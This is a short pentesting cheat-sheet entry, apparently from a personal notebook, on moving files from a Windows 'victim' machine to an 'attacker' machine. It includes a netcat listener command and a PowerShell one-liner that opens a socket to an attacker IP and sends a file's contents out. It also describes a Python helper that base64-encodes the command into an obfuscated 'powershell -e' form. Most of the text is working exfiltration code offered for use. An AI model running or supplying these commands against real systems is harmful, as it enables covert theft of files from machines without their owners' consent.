# PowerShell File Transfer

If we want to transfer a file from a Windows machine to our attacker machine that is listening with a `nc` binary we can use:
```bash
# Attacker machine, store output into a file
nc -lvnp 443 > test.txt
```
Where `443` is the port we want to listen.

Then, in the target machine:
```powershell
# Victim machine
$client = New-Object System.Net.Sockets.TcpClient("<Attacker-IP>", 443); $stream = $client.GetStream(); [byte[]]$bytes = [System.IO.File]::ReadAllBytes("C\Temp\File.txt"); $stream.Write($bytes, 0, $bytes.Length); $stream.Close(); $client.Close()
```

So I generated a simple `Python` script that encodes this in `base64`, accepting as argument the absolute path for the file to transfer, the attacker machine IP address and listening port with `nc`:
```shell
python3 PStransferfile.py 'C:\Windows\Temp\test.txt' 10.10.10.10 443

```

This will generate a command:
```powershell
powershell -e <base64 command>

```
When executed in the victim machine, this command will transfer the file to the attacker machine listening with `nc`, storing the output into the file and transferring the file.
